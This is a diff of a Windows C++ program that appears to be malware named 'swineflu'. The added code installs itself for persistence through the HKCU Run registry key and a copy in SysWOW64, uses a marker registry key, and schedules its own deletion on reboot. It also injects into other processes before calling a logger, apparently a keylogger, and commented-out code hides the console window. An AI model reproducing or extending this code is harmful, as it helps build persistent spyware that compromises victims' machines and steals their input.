@@ -13,11 +13,17 @@
 
 
 #include <iostream>
+using namespace std;
 #include "svchost.h"
 #include <tchar.h>
 
+#include "Common.h"
+using namespace InjecteeFuncs;
 
-using namespace std;
+#include <DbgHelp.h>
+
+
+
 
 string ExePath() {
 	char buffer[MAX_PATH];
@@ -31,64 +37,6 @@ void addStartUpEntry()
 	RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
 }
 
-void firstTimeRunCheck()
-{
-	string str = ExePath();
-	printf(str.c_str());
-	str.append("\\swineflu.exe");
-
-	string swine_name = "swinef2";
-	
-	HKEY hKey = NULL;
-	DWORD rtime;
-
-	//Step 1: Open the key
-	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, "swinef2", 0, KEY_READ, &hKey);
-
-	//Step 2: If failed, create the key
-	if (ERROR_NO_MATCH == sts || ERROR_FILE_NOT_FOUND == sts)
-	{
-		cout << "Creating registry key " << "swinef2" << endl;
-
-		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef2", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
-		
-		RegSetValueEx(hKey,             // subkey handle 
-			"BinxWhalton",        // value name 
-			0,                         // must be zero 
-			REG_EXPAND_SZ,             // value type 
-			(LPBYTE)str.c_str(),          // pointer to value data 
-			(DWORD)(lstrlen(str.c_str()) + 1)*sizeof(CHAR));
-
-		if (ERROR_SUCCESS != j)
-			cout << "Error: Could not create registry key " << "swinef2" << endl << "\tERROR: " << j << endl;
-		else
-			cout << "Success: Key created" << endl;
-
-		rtime = 0;
-
-		printf("created reg key");
-
-		
-
-		int unlucksic = _unlink(
-			str.c_str()
-			);
-
-		if (!unlucksic)
-		{
-			printf("did not work");
-		}
-	}
-	else
-	{
-		printf("reg exists");
-		string recData;
-		RegGetValue(HKEY_CURRENT_USER, "swinef2", "BinxWhalton", RRF_RT_ANY, NULL, &recData, NULL);
-		printf(recData.c_str());
-	}
-}
-
-
 
 void adminstartup()
 {
@@ -96,7 +44,6 @@ void adminstartup()
 	DWORD dwDispoition;
 
 	string str = ExePath();
-	printf(str.c_str());
 	str.append("\\swineflu.exe");
 
 	BOOL b = CopyFile(str.c_str(),
@@ -112,6 +59,62 @@ void adminstartup()
 	}	
 }
 
+void firstTimeRunCheck()
+{
+	string str = ExePath();
+	printf(str.c_str());
+	str.append("\\swineflu.exe");
+
+	string swine_name = "swinef2";
+	
+	HKEY hKey = NULL;
+	DWORD rtime;
+
+	//Step 1: Open the key
+	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, "swinef3", 0, KEY_READ, &hKey);
+
+	//Step 2: If failed, create the key
+	if (ERROR_NO_MATCH == sts || ERROR_FILE_NOT_FOUND == sts)
+	{
+		cout << "Creating registry key " << "swinef3" << endl;
+
+		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef3", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+
+		
+
+		if (ERROR_SUCCESS != j)
+			cout << "Error: Could not create registry key " << "swinef2" << endl << "\tERROR: " << j << endl;
+		else
+			cout << "Success: Key created" << endl;
+
+		rtime = 0;
+
+		printf("created reg key");
+
+		adminstartup();
+
+		addStartUpEntry();
+		
+		MoveFileEx(str.c_str(), // Source File.
+			0, // Destination as null.
+			MOVEFILE_DELAY_UNTIL_REBOOT);
+
+
+		}
+	else
+	{
+		printf("reg exists");
+	}
+}
+
+void injectMethod()
+{
+	int process_id = MyInjecteeFuncs::getNextProcessID(0);
+	printf("Starting injections with process: %d\n", process_id);
+	MyInjecteeFuncs::inject(process_id);
+	printf("\n %d", process_id);
+}
+
 
 
 int _tmain(int argc, _TCHAR* argv[])
@@ -121,29 +124,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	//stealth = FindWindowA("ConsoleWindowClass", NULL);
 	//ShowWindow(stealth, 0);
 	printf("wear your mask please\n");
-	adminstartup();
-
-
-
-	char title[256] = "";
-	string currentProcessTitle = "";
-
-		HWND handle = GetForegroundWindow();
-		if (handle)
-		{
-			GetWindowText(handle, title, 256);
-
-			if (currentProcessTitle != title)
-				currentProcessTitle = title;
-			else
-				printf("%s\r\n", title);
-		}
-		else
-		{
-			printf("not found\r\n");
-		}
-	
-
+	firstTimeRunCheck();
+	injectMethod();
 	logger();
 
 	getchar();
